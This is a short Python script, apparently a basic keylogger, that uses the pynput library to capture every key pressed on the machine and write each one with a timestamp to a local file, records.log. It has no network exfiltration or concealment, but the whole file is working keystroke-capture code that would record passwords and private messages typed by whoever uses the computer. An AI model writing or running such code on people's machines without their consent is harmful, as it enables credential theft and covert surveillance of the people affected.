import logging

from pynput.keyboard import Listener

logging.basicConfig(filename=("records.log"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()